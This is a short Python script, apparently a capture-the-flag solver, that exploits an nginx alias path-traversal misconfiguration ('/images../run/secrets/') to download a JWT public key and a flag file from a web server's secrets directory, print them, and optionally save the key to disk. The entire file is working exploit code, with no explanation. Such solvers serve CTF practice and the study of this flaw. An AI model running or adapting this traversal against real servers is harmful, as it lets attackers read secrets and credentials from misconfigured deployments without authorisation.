import requests
from argparse import ArgumentParser

def main():
    parser = ArgumentParser(prog="flag0", description="Flag 0 solver")
    parser.add_argument("-u", "--url", default="http://localhost:3000", help="The host of the website.")
    parser.add_argument("-o", "--out", help="File to write the key to.")

    args = parser.parse_args()

    url = "{}/images../run/secrets/{}"
    key_url = url.format(args.url, "jwtpublickey")
    flag_url = url.format(args.url, "flag")
    key = requests.get(key_url).content
    flag = requests.get(flag_url).content

    print("PATH TRAVERSAL WITH NGINX ALIAS")
    print("-"*40)
    print("Key URL:", key_url)
    print("Key:", key.decode())
    print("Flag URL:", flag_url)
    print("Flag:", flag.decode())

    if args.out:
        with open(args.out, "wb") as f:
            f.write(key)
        print(f"Wrote key to {args.out}.")

main()
